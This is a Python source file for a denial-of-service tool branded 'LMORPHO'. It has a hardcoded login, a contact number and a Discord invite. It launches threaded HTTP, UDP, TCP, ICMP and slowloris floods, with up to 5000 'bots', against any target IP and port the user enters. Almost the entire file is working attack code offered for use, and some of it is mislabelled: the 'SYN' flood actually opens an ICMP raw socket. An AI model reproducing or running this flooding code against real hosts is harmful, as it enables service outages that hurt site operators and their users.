import time
import os
import random
import threading
import socket
import subprocess
import requests
import sys

from rich.console import Console
from rich.panel import Panel
from rich.text import Text

console = Console()

# === Fix: Close the triple quote for dragon_frame
dragon_frame = r"""
██████╗ ███╗   ███╗███████╗
██╔══██╗████╗ ████║╚════██║
██████╔╝██╔████╔██║    ██╔╝
██╔══██╗██║╚██╔╝██║   ██╔╝
██║  ██║██║ ╚═╝ ██║   ██║
╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝"""

# === Fix: Correct variable name
LMORPHO_text = "★ TOOLS BY LMORPHO DDOSING ★"

line_colors = ["green", "bright_green", "cyan", "magenta"]
rain_chars = ["|", "!", "/", "\\", "1", "I"]

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_rain(width, height, density=0.05):
    rain = []
    for _ in range(height):
        line = "".join(random.choice(rain_chars) if random.random() < density else " " for _ in range(width))
        rain.append(line)
    return rain

def scroll_rain(rain_lines, width, density=0.05):
    rain_lines.pop(0)
    new_line = "".join(random.choice(rain_chars) if random.random() < density else " " for _ in range(width))
    rain_lines.append(new_line)

def hacker_interface(animated_time=5):
    width = console.width
    height = console.height - 10
    rain_lines = generate_rain(width, height)
    start_time = time.time()
    pos = 0
    direction = 1

    while time.time() - start_time < animated_time:
        clear()
        scroll_rain(rain_lines, width)
        for i, line in enumerate(rain_lines):
            color = line_colors[i % len(line_colors)]
            console.print(line, style=color)

        console.print(" " * pos + f"[bold red]{LMORPHO_text}[/bold red]")

        panel = Panel(Text(dragon_frame, style="bold red"), title="[bold red]Access Granted[/bold red]", border_style="red", width=min(80, width - 6))
        console.print(panel, justify="center")

        pos += direction
        if pos >= width - len(LMORPHO_text) - 10:
            direction = -1
        elif pos <= 0:
            direction = 1

        time.sleep(0.03)

def login_interface():
    clear()
    console.print(Panel("[bold red]★ Welcome to LMORPHO Security System ★[/bold red]", border_style="red"))
    username = console.input("[bold red]Enter Username: [/bold red]")
    password = console.input("[bold cyan]Enter Password: [/bold cyan]", password=True)

    if username == "LMORPHO" and password == "LMORPHO":
        console.print(f"[bold green]✔️ Welcome, {username}! Access granted.[/bold green]")
        time.sleep(0.5)
        hacker_interface(animated_time=5)
        clear()
        console.print("[bold green]✅ Starting the main tool...[/bold green]")
        time.sleep(1)
        main_tool()  # Redirect to attack tool
    else:
        console.print(Panel("[bold red]❌ Incorrect Username or Password![/bold red]", border_style="red"))
        time.sleep(1)
        login_interface()

# ===== COLORS =====
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

attack_running = True
bots_active = 0

BANNER = f"""
{Colors.BOLD}{Colors.RED}
██╗     ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗ ██████╗
██║     ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗
██║     ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║██║   ██║
██║     ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██║   ██║
███████╗██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║╚██████╔╝
╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝
{Colors.END}
{Colors.CYAN}{'='*60}
{Colors.BOLD}WHATSAPP:0620914764 METHODES ATTACK TOOL (199+ BOTS SUPPORT)
{Colors.CYAN}{'='*60}{Colors.END}
"""

# ===== BOTS =====
def http_bot(target, port, bot_id):
    global bots_active, attack_running
    try:
        while attack_running:
            try:
                requests.get(f"http://{target}:{port}", timeout=1)
                print(f"{Colors.GREEN}[BOT-{bot_id}] HTTP Attack Sent!{Colors.END}", end='\r')
            except:
                print(f"{Colors.RED}[BOT-{bot_id}] HTTP Failed!{Colors.END}", end='\r')
            time.sleep(0.1)
    finally:
        bots_active -= 1

def udp_bot(target, port, bot_id):
    global bots_active, attack_running
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while attack_running:
            try:
                data = random._urandom(1024)
                sock.sendto(data, (target, port))
                print(f"{Colors.CYAN}[BOT-{bot_id}] UDP Packet Sent!{Colors.END}", end='\r')
            except:
                print(f"{Colors.RED}[BOT-{bot_id}] UDP Failed!{Colors.END}", end='\r')
            time.sleep(0.05)
    finally:
        bots_active -= 1
        sock.close()

def tcp_bot(target, port, bot_id):
    global bots_active, attack_running
    try:
        while attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                sock.send(random._urandom(1024))
                print(f"{Colors.BLUE}[BOT-{bot_id}] TCP Packet Sent!{Colors.END}", end='\r')
                sock.close()
            except:
                print(f"{Colors.RED}[BOT-{bot_id}] TCP Failed!{Colors.END}", end='\r')
            time.sleep(0.1)
    finally:
        bots_active -= 1

def ping_bot(target, bot_id):
    global bots_active, attack_running
    try:
        while attack_running:
            try:
                subprocess.run(f"ping -c 1 {target}", 
                              shell=True,
                              stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL)
                print(f"{Colors.MAGENTA}[BOT-{bot_id}] ICMP Ping Sent!{Colors.END}", end='\r')
            except:
                print(f"{Colors.RED}[BOT-{bot_id}] ICMP Failed!{Colors.END}", end='\r')
            time.sleep(0.5)
    finally:
        bots_active -= 1

def launch_bots(attack_type, target, port, bots_count):
    global bots_active, attack_running
    
    bots_active = bots_count
    attack_running = True
    
    print(f"\n{Colors.YELLOW}[!] Launching {bots_count} BOTS...{Colors.END}")
    
    threads = []
    
    for bot_id in range(1, bots_count + 1):
        if attack_type == 1:
            t = threading.Thread(target=http_bot, args=(target, port, bot_id))
        elif attack_type == 2:
            t = threading.Thread(target=udp_bot, args=(target, port, bot_id))
        elif attack_type == 3:
            t = threading.Thread(target=tcp_bot, args=(target, port, bot_id))
        elif attack_type == 4:
            t = threading.Thread(target=ping_bot, args=(target, bot_id))
        else:
            print(f"{Colors.RED}Invalid attack type.{Colors.END}")
            return
        
        t.start()
        threads.append(t)
        print(f"{Colors.GREEN}[+] BOT-{bot_id} Activated!{Colors.END}")
        time.sleep(0.05)
    
    try:
        while bots_active > 0 and attack_running:
            print(f"{Colors.BOLD}Active BOTS: {bots_active}/{bots_count}{Colors.END}", end='\r')
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Stopping all bots...{Colors.END}")
        attack_running = False
    
    for t in threads:
        t.join()

# ===== ADVANCED LMORPHO ATTACK =====
def start_Lmorpho_attack():  # Fixed name consistency
    MAX_BOTS = 5000
    MAX_ATTACK_TIME = 3600  # 1 hour

    os.system("cls" if os.name == "nt" else "clear")
    print("\033[1;35mWelcome to RM7-LMORPHO World - POWER EDITION\033[0m")
    time.sleep(1)
    print("\033[1;32mLoading Nuclear Codes...\033[0m")
    time.sleep(2)
    os.system("cls" if os.name == "nt" else "clear")

    print(f"""
\033[1;35m
	  AUTHOR TOOLS : RM7 LMORPHO - POWER EDITION

{dragon_frame}
    \033[0m""")

    ip = input(" Target IP: ").strip()
    port = int(input(" Target Port: "))
    attack_time = int(input(" Attack Duration (seconds): "))
    thread_count = int(input(" Attack Bots (1-5000): "))
    attack_mode = int(input(" Attack Mode [1-5]: "))

    # Clamp values
    thread_count = max(1, min(thread_count, MAX_BOTS))
    attack_time = max(10, min(attack_time, MAX_ATTACK_TIME))
    attack_mode = max(1, min(attack_mode, 5))

    PACKET_TYPES = {
        1: (1024, "UDP"),     
        2: (999, "TCP-SYN"),  
        3: (818, "TCP-ACK"),  
        4: (16, "TCP-PSH"),   
        5: (2048, "UDP-MAX")  
    }

    packet_size, attack_name = PACKET_TYPES[attack_mode]
    print(f"\033[1;33m[+] Starting {attack_name} attack with {thread_count} bots for {attack_time} seconds\033[0m")

    end_time = time.time() + attack_time

    def udp_flood():
        data = random._urandom(packet_size)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time and attack_running:
            try:
                s.sendto(data, (ip, port))
            except:
                pass
        s.close()

    def syn_flood():
        while time.time() < end_time and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                s.sendto(random._urandom(packet_size), (ip, port))
                s.close()
            except:
                pass

    def ack_flood():
        while time.time() < end_time and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(random._urandom(packet_size))
                s.close()
            except:
                pass

    def http_flood():
        headers = [
            "User-Agent: Mozilla/5.0",
            "Accept-Language: en-US,en;q=0.5",
            "Connection: keep-alive"
        ]
        while time.time() < end_time and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 80))
                request = f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\nHost: {ip}\r\n"
                for header in headers:
                    request += f"{header}\r\n"
                request += "\r\n"
                s.send(request.encode())
                s.close()
            except:
                pass

    def slowloris():
        headers = [
            "User-Agent: Mozilla/5.0",
            "Accept-Language: en-US,en;q=0.5",
            "Connection: keep-alive",
            "Keep-Alive: timeout=100, max=1000",
            "Content-Length: 1000000"
        ]
        sockets = []
        while time.time() < end_time and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 80))
                request = f"POST /?{random.randint(0, 10000)} HTTP/1.1\r\nHost: {ip}\r\n"
                for header in headers:
                    request += f"{header}\r\n"
                request += "\r\n"
                s.send(request.encode())
                sockets.append(s)
            except:
                pass

            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 10000)}\r\n".encode())
                except:
                    sockets.remove(s)
                time.sleep(0.5)

    ATTACKS = {
        1: udp_flood,
        2: syn_flood,
        3: ack_flood,
        4: http_flood,
        5: slowloris
    }

    threads = []
    global attack_running
    attack_running = True

    print(f"\033[1;31m[!] Launching {attack_name} attack with {thread_count} nuclear bots!\033[0m")
    time.sleep(2)

    for i in range(thread_count):
        if not attack_running:
            break
        t = threading.Thread(target=ATTACKS[attack_mode])
        t.daemon = True
        t.start()
        threads.append(t)

    start_time = time.time()
    try:
        while time.time() < end_time and attack_running:
            elapsed = int(time.time() - start_time)
            remaining = max(0, attack_time - elapsed)
            print(f"\033[1;33m[+] Attack in progress: {elapsed}s elapsed, {remaining}s remaining - {len(threads)} bots active\033[0m", end='\r')
            time.sleep(1)
    except KeyboardInterrupt:
        attack_running = False

    attack_running = False
    print("\n\033[1;32m[+] Attack completed!\033[0m")
    print("\033[1;36m[+] Join our community: discord.gg/8gmRVnRRwV\033[0m")

# ===== MAIN MENU =====
def main_tool():
    global attack_running
    attack_running = True

    try:
        print(BANNER)
        print(f"{Colors.YELLOW}{'='*30} POWER METHODES SETUP {'='*30}{Colors.END}")
        print(f"{Colors.CYAN}1. HTTP Flood Attack")
        print("2. UDP Flood Attack SA-MP")
        print("3. TCP Flood Attack")
        print("4. ICMP Ping Flood")
        print("5. ADVANCED LMORPHO ATTACK" + Colors.END)

        choice = int(input("\nWhat kind of attack do you want? (1-5): "))

        if choice not in [1, 2, 3, 4, 5]:
            print(f"{Colors.RED}[-] Invalid Choice!{Colors.END}")
            return

        if choice == 5:
            start_Lmorpho_attack()  # Fixed: Correct function name
            return

        target = input("Target IP: ").strip()
        port = 80
        if choice in [1, 2, 3]:
            port = int(input("Target Port: "))

        bots_count = int(input("POWR BOTS Count (1-1000): "))
        bots_count = max(1, min(bots_count, 1000))

        duration = int(input("Attack Duration (seconds): "))

        print(f"\n{Colors.RED}{'='*30} ATTACK STARTED {'='*30}{Colors.END}")
        start_time = time.time()

        attack_thread = threading.Thread(
            target=launch_bots,
            args=(choice, target, port, bots_count)
        )
        attack_thread.start()

        try:
            while time.time() < start_time + duration and attack_running:
                elapsed = int(time.time() - start_time)
                remaining = max(0, duration - elapsed)
                print(f"{Colors.BOLD}Elapsed: {elapsed}s | Remaining: {remaining}s | Bots: {bots_active}/{bots_count}{Colors.END}", end='\r')
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Interrupted. Stopping...{Colors.END}")
            attack_running = False
        finally:
            attack_running = False
            attack_thread.join()

        print(f"\n\n{Colors.GREEN}{'='*30} ATTACK COMPLETED {'='*30}{Colors.END}")
        print(f"{Colors.YELLOW}Total Attack Duration: {duration} seconds")
        print(f"Maximum Bots Activated: {bots_count}{Colors.END}")

    except Exception as e:
        print(f"{Colors.RED}[-] ERROR: {str(e)}{Colors.END}")
    finally:
        attack_running = False

# === Entry Point ===
if __name__ == "__main__":
    login_interface()  # Start with login
